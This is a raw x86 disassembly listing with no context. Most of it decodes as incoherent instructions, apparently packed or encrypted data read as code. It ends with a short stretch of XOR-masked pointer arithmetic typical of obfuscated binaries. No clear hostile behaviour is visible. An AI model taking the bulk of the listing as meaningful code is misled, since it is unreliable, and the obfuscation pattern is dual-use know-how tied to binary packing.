  418a91:	or     al,BYTE PTR [ebp-0xc]
  418a94:	push   ecx
  418a95:	jg     0x418ae5
  418a97:	pushf  
  418a98:	adc    BYTE PTR [esi+eiz*4],dh
  418a9b:	int3   
  418a9c:	mov    WORD PTR [ebx+0x6549337c],ds
  418aa2:	pop    esp
  418aa3:	jae    0x418b20
  418aa5:	inc    esi
  418aa6:	popa   
  418aa7:	or     BYTE PTR [ecx+0x21],ch
  418aaa:	sar    DWORD PTR [ebx+0x68e33a05],0xc5
  418ab1:	xchg   esi,eax
  418ab2:	jno    0x418a35
  418ab4:	sar    DWORD PTR [ebx+0x5d533b76],1
  418aba:	push   esi
  418abb:	and    bh,BYTE PTR [ecx-0x2380253e]
  418ac1:	ins    BYTE PTR es:[edi],dx
  418ac2:	test   eax,0x6beeeeb2
  418ac7:	push   esi
  418ac8:	cld    
  418ac9:	inc    ebx
  418aca:	(bad)  
  418acb:	lock push ebp
  418acd:	popf   
  418ace:	jbe    0x418b36
  418ad0:	pop    es
  418ad1:	inc    ebp
  418ad2:	mov    esp,0xe2fd610e
  418ad7:	and    al,0x17
  418ad9:	arpl   WORD PTR [ebx-0x52],di
  418adc:	repnz fidivr DWORD PTR [ecx+esi*8]
  418ae0:	cmp    ecx,DWORD PTR [edx+eiz*8+0x23]
  418ae4:	js     0x418ac9
  418ae6:	stc    
  418ae7:	retf   0xa8b
  418aea:	mov    DWORD PTR [eax],ebp
  418aec:	pop    ss
  418aed:	push   esp
  418aee:	jae    0x418b3d
  418af0:	and    al,bh
  418af2:	jge    0x418ae1
  418af4:	pop    ecx
  418af5:	dec    ebx
  418af6:	rol    BYTE PTR [ebx+0x4],1
  418af9:	sub    al,0xd
  418afb:	dec    eax
  418afc:	repnz push ebx
  418afe:	xor    bh,BYTE PTR [edi]
  418b00:	sbb    eax,0x8f1f961b
  418b05:	jmp    0x418aaf
  418b07:	xor    edi,DWORD PTR [eax]
  418b09:	jo     0x418ab9
  418b0b:	sahf   
  418b0c:	dec    ebp
  418b0d:	mov    cl,0xac
  418b0f:	xchg   ebp,eax
  418b10:	imul   esp,DWORD PTR [edi],0x6a
  418b13:	ss jp  0x418b49
  418b16:	sub    ebp,ecx
  418b18:	adc    al,0x52
  418b1a:	(bad)  
  418b1c:	sbb    dh,cl
  418b1e:	call   0xdc7:0xa46a91d3
  418b25:	push   cs
  418b26:	pop    esp
  418b27:	xchg   esp,eax
  418b28:	mov    ebp,ss
  418b2a:	add    BYTE PTR [edi+0x59],ah
  418b2d:	hlt    
  418b2e:	iret   
  418b2f:	or     ch,ah
  418b31:	inc    ebx
  418b32:	or     eax,0x8b187299
  418b37:	sbb    eax,DWORD PTR [ebp+0x79a9eed1]
  418b3d:	mov    ds:0x2421564e,eax
  418b42:	addr16 in eax,0x99
  418b45:	mov    edi,edx
  418b47:	loopne 0x418b1f
  418b49:	jp     0x418ba2
  418b4b:	xchg   edx,eax
  418b4c:	hlt    
  418b4d:	out    dx,al
  418b4e:	push   esp
  418b4f:	stos   DWORD PTR es:[edi],eax
  418b50:	sbb    al,0x1
  418b52:	retf   0x26d0
  418b55:	scas   eax,DWORD PTR es:[edi]
  418b56:	xor    DWORD PTR ds:0x2f6b4566,edx
  418b5c:	outs   dx,DWORD PTR ds:[esi]
  418b5d:	sub    DWORD PTR [edx-0x41deb085],edi
  418b63:	scas   al,BYTE PTR es:[edi]
  418b64:	es scas al,BYTE PTR es:[edi]
  418b66:	sub    al,0x23
  418b68:	jne    0x418bbc
  418b6a:	mov    cl,0xb5
  418b6c:	fld    QWORD PTR [bp+di+0x7c9a]
  418b71:	inc    ebp
  418b72:	pop    ss
  418b73:	popf   
  418b74:	fs clc 
  418b76:	nop
  418b77:	or     DWORD PTR [ebp-0x3b],edx
  418b7a:	repnz dec edi
  418b7d:	inc    eax
  418b7e:	cmovl  eax,DWORD PTR [ecx-0xba8f4ef]
  418b85:	inc    eax
  418b86:	push   edx
  418b87:	je     0x418bb1
  418b89:	ins    DWORD PTR es:[edi],dx
  418b8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b8b:	dec    edi
  418b8c:	sub    DWORD PTR [ebp-0x2d2887e1],0x72
  418b93:	inc    ebx
  418b94:	aam    0xc4
  418b96:	mov    ?,WORD PTR [eax-0x23]
  418b99:	xchg   esp,eax
  418b9a:	pop    ecx
  418b9b:	test   eax,0x93800d1b
  418ba0:	add    ch,BYTE PTR [esi]
  418ba2:	jg     0x418c1f
  418ba4:	sbb    al,ch
  418ba6:	lock into 
  418ba8:	mov    dh,0xa
  418baa:	add    BYTE PTR [ebp-0x540e287c],dl
  418bb0:	leave  
  418bb1:	stos   DWORD PTR es:[edi],eax
  418bb2:	fld    TBYTE PTR [esi]
  418bb4:	lods   al,BYTE PTR ds:[esi]
  418bb5:	pop    esp
  418bb6:	dec    ebp
  418bb7:	aaa    
  418bb8:	and    al,0xf7
  418bba:	pop    edx
  418bbb:	pop    edx
  418bbc:	pushf  
  418bbd:	popf   
  418bbe:	mov    eax,ds:0x5568ad80
  418bc3:	xchg   ecx,eax
  418bc4:	loop   0x418bc9
  418bc6:	mov    WORD PTR [ebp+0xf4d6c66],fs
  418bcc:	jl     0x418b6c
  418bce:	ins    BYTE PTR es:[edi],dx
  418bcf:	inc    esp
  418bd0:	jbe    0x418c30
  418bd2:	cmp    edx,esi
  418bd4:	pop    eax
  418bd5:	xor    dh,BYTE PTR [eax]
  418bd7:	(bad)  
  418bd8:	loop   0x418c2c
  418bda:	in     al,0x49
  418bdc:	cli    
  418bdd:	out    0x9e,al
  418bdf:	fdivrp st(5),st
  418be1:	ins    BYTE PTR es:[edi],dx
  418be2:	sbb    dl,BYTE PTR [ebp+0x462f1965]
  418be8:	mov    esp,0x982296a8
  418bed:	sub    DWORD PTR [ebx+0x38dffde9],edx
  418bf3:	popa   
  418bf4:	sub    edi,ecx
  418bf6:	pop    ebp
  418bf7:	imul   ecx,DWORD PTR [ecx],0x12d3a5f0
  418bfd:	mov    ebx,0xeff60512
  418c02:	cmp    eax,0x7dd3040b
  418c07:	sub    si,WORD PTR [ebx-0x11]
  418c0b:	jge    0x418c83
  418c0d:	pop    eax
  418c0e:	sbb    al,0x70
  418c10:	push   edx
  418c11:	(bad)  
  418c12:	jno    0x418c3e
  418c14:	in     al,0x2c
  418c16:	std    
  418c17:	add    esi,DWORD PTR [eax-0x2d]
  418c1a:	aad    0xec
  418c1c:	cmp    ch,bh
  418c1e:	mov    eax,0x65964a96
  418c23:	pop    ds
  418c24:	lds    edx,FWORD PTR [ecx-0x5f68d8e9]
  418c2a:	sar    BYTE PTR [edx+0x65c7d35f],0x84
  418c31:	inc    eax
  418c32:	cmp    BYTE PTR [esi-0x60],0xb6
  418c36:	popa   
  418c37:	add    bh,BYTE PTR [esi+0x4ad6ecf6]
  418c3d:	cmp    eax,0x891bc94d
  418c42:	mul    cl
  418c44:	lahf   
  418c45:	dec    ebx
  418c46:	xchg   ecx,eax
  418c47:	test   DWORD PTR [ecx],0x13aeff47
  418c4d:	mov    esp,ss
  418c4f:	mov    al,0x3c
  418c51:	jne    0x418cc9
  418c53:	xor    eax,0x2efc6ac8
  418c58:	clc    
  418c59:	into   
  418c5a:	pop    esp
  418c5b:	mov    ds:0x64c168df,al
  418c60:	push   ecx
  418c61:	sbb    DWORD PTR [eax],0x6d
  418c64:	xchg   BYTE PTR [ebx+0x3de207c2],ch
  418c6a:	push   0x9f028ecb
  418c6f:	push   ebp
  418c70:	in     al,0x9c
  418c72:	mov    ebx,0x7fd39bcd
  418c77:	jnp    0x418c19
  418c79:	xchg   ebp,eax
  418c7a:	pop    esp
  418c7b:	jo     0x418c2e
  418c7d:	and    al,0x32
  418c7f:	xor    ebx,DWORD PTR [esi-0x6e]
  418c82:	popa   
  418c83:	mov    BYTE PTR [ebx],cl
  418c85:	sub    al,0xda
  418c87:	jp     0x418cec
  418c89:	pop    esi
  418c8a:	lahf   
  418c8b:	mov    dl,0x59
  418c8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c8e:	push   esi
  418c8f:	test   BYTE PTR [ecx-0x52e0050f],dh
  418c95:	outs   dx,BYTE PTR ds:[esi]
  418c96:	jno    0x418c33
  418c98:	or     DWORD PTR [esi+0x2973e1e1],ecx
  418c9e:	fwait
  418c9f:	bound  esp,QWORD PTR [ecx-0x3dc07137]
  418ca5:	js     0x418cf6
  418ca7:	mov    edx,0xd9da10c2
  418cac:	jle    0x418c6c
  418cae:	inc    edi
  418caf:	add    eax,0xacc83ca7
  418cb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cb5:	popa   
  418cb6:	jmp    0x8798d29c
  418cbb:	(bad)  
  418cbc:	out    0x9b,eax
  418cbe:	scas   eax,DWORD PTR es:[edi]
  418cbf:	inc    edx
  418cc0:	pop    esp
  418cc1:	cli    
  418cc2:	loop   0x418d24
  418cc4:	lea    ebp,[ecx+0x48]
  418cc7:	(bad)  
  418cc8:	fdiv   DWORD PTR [ecx+0x19]
  418ccb:	xlat   BYTE PTR ds:[ebx]
  418ccc:	mov    dl,0xa
  418cce:	ins    BYTE PTR es:[edi],dx
  418ccf:	or     DWORD PTR [ebx+ebp*1],0x796414f3
  418cd6:	pop    eax
  418cd7:	jns    0x418d02
  418cd9:	adc    BYTE PTR [eax+eiz*1],dh
  418cdc:	jecxz  0x418cb8
  418cde:	jnp    0x418cbd
  418ce0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ce1:	enter  0x30e4,0xae
  418ce5:	in     eax,0x2c
  418ce7:	pop    ds
  418ce8:	in     al,0xa3
  418cea:	adc    al,0x63
  418cec:	fstp   DWORD PTR [ecx-0x78f1014b]
  418cf2:	(bad)  
  418cf3:	xor    bl,BYTE PTR [ebx+ecx*1]
  418cf6:	aas    
  418cf7:	imul   edx,DWORD PTR [edi+0x10],0x29e0440c
  418cfe:	(bad)  
  418cff:	test   eax,0xb91de862
  418d04:	and    eax,0x9c981b58
  418d09:	add    BYTE PTR [esp+ecx*8-0x68defef7],dl
  418d10:	lods   eax,DWORD PTR ds:[esi]
  418d11:	sub    ecx,DWORD PTR [ebx+0x2965fb68]
  418d17:	shl    esp,1
  418d19:	pop    es
  418d1a:	xor    ebx,DWORD PTR [ecx]
  418d1c:	cs rcr ebx,1
  418d1f:	mov    edx,0x918f8e70
  418d24:	arpl   ax,si
  418d26:	stos   BYTE PTR es:[edi],al
  418d27:	mov    esp,0x43e8a74b
  418d2c:	sub    eax,0xe40ca6e4
  418d31:	cwde   
  418d32:	in     eax,dx
  418d33:	cli    
  418d34:	jecxz  0x418d9d
  418d36:	sbb    ecx,DWORD PTR [edi+0x649b20bb]
  418d3c:	jnp    0x418d81
  418d3e:	aad    0xdf
  418d40:	lods   al,BYTE PTR ds:[esi]
  418d41:	push   cs
  418d42:	jl     0x418cfd
  418d44:	jns    0x418dba
  418d46:	sub    al,0x4b
  418d48:	mov    WORD PTR [ecx],ss
  418d4a:	test   eax,0x779804e5
  418d4f:	pop    ecx
  418d50:	fisttp WORD PTR [eax-0x5c09147]
  418d56:	cld    
  418d57:	add    al,bh
  418d59:	xchg   ebx,eax
  418d5a:	(bad)  
  418d5b:	or     BYTE PTR [ecx],cl
  418d5d:	jp     0x418d29
  418d5f:	push   ebx
  418d60:	adc    esp,DWORD PTR [esi-0x64d1dd15]
  418d66:	enter  0x910f,0xc1
  418d6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d6b:	aam    0x2
  418d6d:	xchg   ecx,eax
  418d6e:	shr    DWORD PTR ds:0xd4ae885d,1
  418d74:	mov    esp,0x691c3d7
  418d79:	adc    al,0x99
  418d7b:	clc    
  418d7c:	imul   esi,DWORD PTR [ecx],0x23
  418d7f:	xor    eax,0x21b3faa0
  418d84:	icebp  
  418d85:	dec    esi
  418d86:	pop    edi
  418d87:	dec    ebx
  418d88:	aad    0xbe
  418d8a:	adc    eax,0xbdedc490
  418d8f:	sub    edx,DWORD PTR [edi+0x6f]
  418d92:	mov    eax,ds:0xc801bcdc
  418d97:	adc    eax,0x878c8bb1
  418d9c:	out    dx,eax
  418d9d:	mov    dh,0xfa
  418d9f:	pop    ds
  418da0:	jl     0x418d30
  418da2:	out    0xa8,eax
  418da4:	jge    0x418d73
  418da6:	and    DWORD PTR [esp+edi*8-0x3fc11c77],ecx
  418dad:	std    
  418dae:	cmp    al,0xa0
  418db0:	mov    cl,0x2e
  418db2:	ret    0xfb38
  418db5:	jbe    0x418d46
  418db7:	mov    ?,WORD PTR [edx-0x4e387b65]
  418dbd:	cli    
  418dbe:	mov    ebx,DWORD PTR [esi+0x61]
  418dc1:	test   al,0xf8
  418dc3:	push   ds
  418dc4:	mov    DWORD PTR [edx+ebp*1+0x7f],eax
  418dc8:	sub    BYTE PTR [esi+0x34],ah
  418dcb:	mov    bh,0xda
  418dcd:	test   esp,ecx
  418dcf:	push   edx
  418dd0:	mov    ah,ch
  418dd2:	fstp   QWORD PTR [eax]
  418dd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418dd5:	or     edx,DWORD PTR [ebp+eax*1-0x6f455e66]
  418ddc:	mov    es,esi
  418dde:	pop    esi
  418ddf:	cli    
  418de0:	mov    ch,0xda
  418de2:	out    dx,eax
  418de3:	sbb    DWORD PTR [eax+edx*4],ecx
  418de6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418de7:	mov    bl,0xaf
  418de9:	jg     0x418e23
  418deb:	(bad)  
  418dec:	jl     0x418dea
  418dee:	push   edx
  418def:	jmp    FWORD PTR [ecx+ebp*4+0x59b246d1]
  418df6:	jne    0x418dde
  418df8:	repnz pop eax
  418dfa:	ss (bad) 
  418dfc:	jbe    0x418e08
  418dfe:	test   BYTE PTR [edi],bl
  418e00:	rcr    DWORD PTR [ebx-0x79f77719],1
  418e06:	sbb    ebp,ecx
  418e08:	in     eax,dx
  418e09:	dec    ecx
  418e0a:	int    0x6e
  418e0c:	fcom   QWORD PTR [ecx+0x25]
  418e0f:	sbb    BYTE PTR [edi-0x17],0x7c
  418e13:	fcmovu st,st(5)
  418e15:	cmp    esi,ebp
  418e17:	cmp    BYTE PTR [esp+eax*2+0x53],0x23
  418e1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e1d:	scas   al,BYTE PTR es:[edi]
  418e1e:	fnstenv [edi]
  418e20:	pop    esp
  418e21:	sar    BYTE PTR [edi],1
  418e23:	push   ss
  418e24:	js     0x418e53
  418e26:	call   0x1efa4852
  418e2b:	loope  0x418e6d
  418e2d:	add    DWORD PTR [eax-0x9],ebp
  418e30:	lahf   
  418e31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e32:	arpl   WORD PTR [edx+0x74],bx
  418e35:	dec    ebp
  418e36:	stos   BYTE PTR es:[edi],al
  418e37:	dec    esp
  418e38:	das    
  418e39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e3a:	mov    esi,0xcb9e3910
  418e3f:	sahf   
  418e40:	call   0xb6708b7e
  418e45:	cmc    
  418e46:	aas    
  418e47:	jle    0x418e4f
  418e49:	or     bh,BYTE PTR [ebx+esi*1]
  418e4c:	div    BYTE PTR cs:[ebx-0x425d8441]
  418e53:	je     0x418dd7
  418e55:	outs   dx,BYTE PTR ds:[esi]
  418e56:	mov    ebx,0x21fc0939
  418e5b:	mov    DWORD PTR [ebp-0x5],edx
  418e5e:	(bad)  
  418e5f:	push   edx
  418e60:	mov    ebx,0x3770341b
  418e65:	adc    bh,BYTE PTR [esi-0x49]
  418e68:	adc    BYTE PTR [esi+0x1f],cl
  418e6b:	les    ecx,FWORD PTR ds:0xe82ee74b
  418e71:	sbb    eax,0xd1e69d5f
  418e76:	test   DWORD PTR [di-0x31e9],ecx
  418e7b:	mov    edx,?
  418e7d:	popa   
  418e7e:	mov    ch,0xe9
  418e80:	adc    esp,DWORD PTR [edi-0x22bf7cab]
  418e86:	cmc    
  418e87:	mov    ch,0x53
  418e89:	pop    edi
  418e8a:	aaa    
  418e8b:	pushf  
  418e8c:	int3   
  418e8d:	mov    ds:0xfb2f8394,al
  418e92:	fldenv [ecx+0x51]
  418e95:	sub    DWORD PTR [ebx+eiz*1+0x7f],ebx
  418e99:	dec    esi
  418e9a:	(bad)  
  418e9b:	iret   
  418e9c:	mov    ebp,0x702b9df5
  418ea1:	pop    ecx
  418ea2:	and    bh,BYTE PTR [ebx-0x14]
  418ea5:	in     al,0x3
  418ea7:	lds    edx,FWORD PTR [eax+0x33cbf04f]
  418ead:	jne    0x418f03
  418eaf:	jo     0x418ea9
  418eb1:	add    eax,0x21d10d83
  418eb6:	test   BYTE PTR [ecx-0x49],dl
  418eb9:	popf   
  418eba:	(bad)  
  418ebb:	repnz out dx,eax
  418ebd:	pop    edx
  418ebe:	and    BYTE PTR [edi+0x42],dl
  418ec1:	mov    bl,0x38
  418ec3:	stos   BYTE PTR es:[edi],al
  418ec4:	mov    bl,0x68
  418ec6:	sbb    DWORD PTR [ecx+0x27dc76b],0xffffff8f
  418ecd:	sub    esp,0xb6525a0d
  418ed3:	ins    BYTE PTR es:[edi],dx
  418ed4:	pop    edx
  418ed5:	sbb    al,ah
  418ed7:	call   0xa4f3:0xe7b54f1c
  418ede:	and    BYTE PTR [eax-0x2de6ba8f],cl
  418ee4:	pop    eax
  418ee5:	xchg   esi,eax
  418ee6:	or     esp,edi
  418ee8:	xor    BYTE PTR [esi-0x30],ch
  418eeb:	jge    0x418f3c
  418eed:	jne    0x418f5d
  418eef:	push   eax
  418ef0:	inc    edi
  418ef1:	retf   0x4dc9
  418ef4:	mov    DWORD PTR [edi-0x452402ae],esp
  418efa:	ins    BYTE PTR es:[edi],dx
  418efb:	mov    esi,0xc2aea92c
  418f00:	xor    BYTE PTR [esi+0x19],dl
  418f03:	cmp    BYTE PTR [esi+0x5c7a8711],bh
  418f09:	hlt    
  418f0a:	loopne 0x418f1a
  418f0c:	imul   DWORD PTR [ebx+0x4b]
  418f0f:	jle    0x418f40
  418f11:	xchg   edi,eax
  418f12:	cli    
  418f13:	inc    esi
  418f14:	pop    es
  418f15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f16:	lods   eax,DWORD PTR ds:[esi]
  418f17:	or     al,0x76
  418f19:	dec    eax
  418f1a:	test   BYTE PTR [esi-0x6d6782c5],dl
  418f20:	pop    edi
  418f21:	xchg   ecx,eax
  418f22:	int3   
  418f23:	loopne 0x418f63
  418f25:	dec    eax
  418f26:	push   ebp
  418f27:	mov    esp,0x7a9dd575
  418f2c:	sbb    BYTE PTR [ecx+eiz*2+0x56],ah
  418f30:	aas    
  418f31:	dec    edx
  418f32:	enter  0x8e46,0x23
  418f36:	mov    ds:0x6b443673,al
  418f3b:	or     al,BYTE PTR ds:0xdc6dbc66
  418f41:	and    al,0x68
  418f43:	add    al,0xc3
  418f45:	call   0x63c4e1a9
  418f4a:	mov    ch,0x54
  418f4c:	(bad)  
  418f4d:	rcl    DWORD PTR [esi-0x2412d912],1
  418f53:	sub    eax,0xc2dfff6f
  418f58:	fidivr WORD PTR [edx+0x53e11aa9]
  418f5e:	int    0x6d
  418f60:	fidiv  WORD PTR gs:[ebx+0x6dbced69]
  418f67:	pop    es
  418f68:	jecxz  0x418f34
  418f6a:	lock jo 0x418f04
  418f6d:	fdiv   QWORD PTR [esi]
  418f6f:	adc    eax,0x90960d3a
  418f74:	jecxz  0x418f36
  418f76:	mov    dh,BYTE PTR [ecx+ecx*1+0x21]
  418f7a:	je     0x418f27
  418f7c:	jp     0x418fa8
  418f7e:	(bad)  
  418f7f:	cmp    ah,BYTE PTR [edx-0x7b]
  418f82:	xchg   bh,dh
  418f84:	js     0x418f94
  418f86:	push   edi
  418f87:	mov    BYTE PTR [edx],dh
  418f89:	push   edi
  418f8a:	sbb    dl,BYTE PTR [edi-0x35]
  418f8d:	mov    bh,BYTE PTR [ebx-0x390fa89b]
  418f93:	nop
  418f94:	xchg   esi,eax
  418f95:	inc    edi
  418f96:	inc    dh
  418f98:	das    
  418f99:	scas   al,BYTE PTR es:[edi]
  418f9a:	int    0x94
  418f9c:	sub    BYTE PTR ds:0x897e63f4,dl
  418fa2:	jmp    0x418f92
  418fa4:	adc    DWORD PTR [esi-0x49dd56b6],0x22
  418fab:	dec    esi
  418fac:	jbe    0x418f5b
  418fae:	aas    
  418faf:	xor    edx,DWORD PTR [edi+0x53]
  418fb2:	cld    
  418fb3:	clc    
  418fb4:	test   dh,dl
  418fb6:	fcomip st,st(0)
  418fb8:	dec    ebp
  418fb9:	lea    ebx,[esi]
  418fbb:	fldcw  WORD PTR [esi+0x48e7ed84]
  418fc1:	inc    esp
  418fc2:	out    dx,al
  418fc3:	mov    esi,DWORD PTR [esi]
  418fc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fc6:	ret    0xe413
  418fc9:	iret   
  418fca:	or     eax,0x388ec6f1
  418fcf:	aaa    
  418fd0:	push   0xc9e3233f
  418fd5:	(bad)  
  418fd6:	pop    ebx
  418fd7:	stos   DWORD PTR es:[edi],eax
  418fd8:	rcl    BYTE PTR [ebx+0xe],1
  418fdb:	mov    edx,0x95c2f459
  418fe0:	jle    0x419011
  418fe2:	enter  0x7ca0,0x73
  418fe6:	xor    ah,0x55
  418fe9:	ret    
  418fea:	mov    esi,0x204d269e
  418fef:	dec    eax
  418ff0:	fcomp  QWORD PTR [edx+0x41249889]
  418ff6:	repz test al,0x4
  418ff9:	pop    eax
  418ffa:	je     0x418fc1
  418ffc:	mov    esp,0x21e2f261
  419001:	mov    dl,0x25
  419003:	jmp    0x90ce24b
  419008:	test   BYTE PTR ds:0x771a2e00,dl
  41900e:	sub    bl,ah
  419010:	jge    0x419007
  419012:	adc    ah,BYTE PTR [edi+0x41]
  419015:	arpl   ax,bp
  419017:	popa   
  419018:	inc    esi
  419019:	into   
  41901a:	or     DWORD PTR [edx+0xb],edx
  41901d:	retf   0xbb0b
  419020:	jae    0x418fe5
  419022:	retf   0x7e7
  419025:	cli    
  419026:	or     edi,esp
  419028:	dec    ebp
  419029:	cmp    al,0x80
  41902b:	and    BYTE PTR [esi+ebx*1-0x617a07c8],ah
  419032:	scas   al,BYTE PTR es:[edi]
  419033:	xlat   BYTE PTR ds:[ebx]
  419034:	psraw  mm1,QWORD PTR [edx]
  419037:	cdq    
  419038:	out    dx,al
  419039:	adc    DWORD PTR [ebx+esi*4],ebx
  41903c:	inc    edx
  41903d:	xlat   BYTE PTR ds:[ebx]
  41903e:	jmp    0xbe6cd76e
  419043:	subps  xmm6,XMMWORD PTR [eax-0x48dd08a]
  41904a:	cmp    ebp,DWORD PTR [ebx+0xc0027a4]
  419050:	dec    esp
  419051:	push   esi
  419052:	jmp    0x419054
  419054:	pop    esp
  419055:	retf   
  419056:	adc    esp,DWORD PTR [ecx-0x20]
  419059:	xchg   ecx,eax
  41905a:	cmp    ebp,DWORD PTR es:[esi-0x1a7db8a7]
  419061:	lock fisub DWORD PTR [ecx-0x61e99b4d]
  419068:	inc    ebp
  419069:	jg     0x419064
  41906b:	adc    edi,DWORD PTR [edx]
  41906d:	loop   0x41904e
  41906f:	imul   DWORD PTR [ecx]
  419071:	push   edx
  419072:	inc    esi
  419073:	inc    esi
  419074:	retf   0xe0d9
  419077:	adc    cl,BYTE PTR [ebx-0x7e]
  41907a:	mov    ebp,0xaa3effd3
  41907f:	xchg   edi,esp
  419081:	jmp    0x4190e0
  419083:	add    al,dh
  419085:	loop   0x4190a9
  419087:	test   eax,0xbc1f8fbf
  41908c:	mov    esp,0xe20f3110
  419091:	jne    0x419043
  419093:	sbb    ebx,DWORD PTR [eax]
  419095:	push   0xffffffed
  419097:	sub    eax,0xbb47eb16
  41909c:	mov    eax,0x14324b67
  4190a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190a2:	add    DWORD PTR [edi],esp
  4190a4:	sbb    BYTE PTR [ebp+edi*8+0x3c],ah
  4190a8:	xor    ch,BYTE PTR [edx+ebp*8]
  4190ab:	push   edx
  4190ac:	daa    
  4190ad:	mov    edx,0x174ec7ed
  4190b2:	popa   
  4190b3:	into   
  4190b4:	jmp    0xf7cf:0xd235eefc
  4190bb:	mov    ch,0x90
  4190bd:	mov    edi,0x6e6f8764
  4190c2:	aad    0x53
  4190c4:	scas   al,BYTE PTR es:[edi]
  4190c5:	push   ebp
  4190c6:	ss gs mov ch,0x36
  4190ca:	pop    ebx
  4190cb:	rcl    DWORD PTR [edx-0x63],1
  4190ce:	sub    ah,bl
  4190d0:	cdq    
  4190d1:	pop    edx
  4190d2:	push   esi
  4190d3:	mov    dh,0x5f
  4190d5:	jns    0x41906e
  4190d7:	rcr    eax,cl
  4190d9:	popa   
  4190da:	gs jecxz 0x41907d
  4190dd:	jae    0x41912b
  4190df:	adc    eax,ecx
  4190e1:	xchg   edi,eax
  4190e2:	cld    
  4190e3:	js     0x41912e
  4190e5:	dec    esi
  4190e6:	add    BYTE PTR [edx+eax*1+0x33ded728],ah
  4190ed:	mov    edi,0xa2c17e70
  4190f2:	or     cl,BYTE PTR [ecx+esi*8]
  4190f5:	push   0x90a3bca6
  4190fa:	xchg   ecx,eax
  4190fb:	jg     0x419109
  4190fd:	mov    al,ds:0x9dcab343
  419102:	sbb    BYTE PTR [edi-0x52d0d7ba],bh
  419108:	mov    BYTE PTR [esp+eax*2+0x167b9cef],dh
  41910f:	dec    ebp
  419110:	punpckhbw mm3,QWORD PTR [ecx]
  419113:	cmp    al,0xba
  419115:	stc    
  419116:	fsub   DWORD PTR [edi-0x52efda5b]
  41911c:	jnp    0x419102
  41911e:	bound  eax,QWORD PTR [ecx-0x2e0c62e6]
  419124:	xchg   BYTE PTR [ebx+esi*1-0x7800f326],al
  41912b:	push   esp
  41912c:	xor    al,0x2c
  41912e:	push   DWORD PTR [ecx-0x43d738db]
  419134:	aas    
  419135:	retf   
  419136:	(bad)  
  419137:	sar    DWORD PTR [ebx],1
  419139:	test   eax,0x130588f3
  41913e:	sub    eax,DWORD PTR [ebp+0x5b62960]
  419144:	dec    eax
  419145:	jb     0x419185
  419147:	cmp    eax,0x367a531f
  41914c:	aas    
  41914d:	xor    esp,DWORD PTR [ebx-0x4c911360]
  419153:	iret   
  419154:	mov    dh,0xd1
  419156:	sub    eax,0xdbbc7a01
  41915b:	sbb    eax,ecx
  41915d:	fist   WORD PTR [ebp-0x56da65b0]
  419163:	(bad)  
  419164:	add    dh,al
  419166:	scas   al,BYTE PTR es:[edi]
  419167:	lahf   
  419168:	out    0x5d,al
  41916a:	or     al,0x11
  41916c:	sbb    eax,0xbbde31c6
  419171:	cmp    BYTE PTR [ecx+0x45b9cab7],ch
  419177:	sbb    al,0xd4
  419179:	shl    DWORD PTR [ebp-0x5c],1
  41917c:	int3   
  41917d:	or     ebp,edi
  41917f:	enter  0x40c0,0x6d
  419183:	mov    dh,BYTE PTR [esi]
  419185:	cdq    
  419186:	stc    
  419187:	call   0xe23d:0x6e3aa739
  41918e:	repnz push ebx
  419190:	cmp    al,0xe3
  419192:	ss jne 0x4191e1
  419195:	pop    DWORD PTR gs:[esp+esi*2]
  419199:	test   al,0x20
  41919b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41919c:	scas   al,BYTE PTR es:[edi]
  41919d:	and    ebx,DWORD PTR [edx-0xa]
  4191a0:	imul   DWORD PTR gs:[edx]
  4191a3:	cmp    DWORD PTR [ecx+eiz*8-0x3e],edi
  4191a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191a8:	jl     0x419198
  4191aa:	jp     0x419132
  4191ac:	inc    ebx
  4191ad:	cmp    eax,0x3e54fdb4
  4191b2:	adc    ecx,esp
  4191b4:	sbb    bl,BYTE PTR [edx]
  4191b6:	or     al,0x42
  4191b8:	std    
  4191b9:	push   ss
  4191ba:	retf   
  4191bb:	mov    eax,DWORD PTR [ebp-0x18]
  4191be:	mov    edx,DWORD PTR [ebp-0x10]
  4191c1:	xor    eax,esi
  4191c3:	lea    eax,[eax+edx*1+0x3272db]
  4191ca:	mov    DWORD PTR [ebp-0x10],eax
  4191cd:	jmp    0x40deb0
  4191d2:	mov    eax,DWORD PTR [ebp-0x34]
  4191d5:	mov    edx,DWORD PTR [ebp+0xc]
  4191d8:	xor    edx,esi
  4191da:	lea    ecx,[ecx+edx*1+0x3272db]
  4191e1:	lea    edx,[ecx-0x3272db]
  4191e7:	xor    edx,esi
  4191e9:	cmp    edx,0xf89c95b6
  4191ef:	jne    0x40dd2f
  4191f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4191f8:	mov    edx,DWORD PTR [ebp+0xc]
  4191fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4191fe:	xor    edx,esi
  419200:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  419207:	xor    ecx,esi
  419209:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  419210:	xor    ebx,esi
  419212:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  419219:	mov    edx,DWORD PTR [ebp+0xc]
  41921c:	xor    edx,esi
  41921e:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  419225:	mov    eax,DWORD PTR [ebp+0xc]
  419228:	xor    eax,esi
  41922a:	add    eax,edi
  41922c:	pop    edi
  41922d:	pop    esi
  41922e:	pop    ebx
  41922f:	leave  
  419230:	ret    0x8
  419233:	push   ebp
  419234:	mov    ebp,esp
  419236:	mov    DWORD PTR ds:0x421a72,0xf89c85b5
  419240:	pop    ebp
  419241:	jmp    0x4193b5
  419246:	push   ebp
  419247:	mov    ebp,esp
  419249:	push   ecx
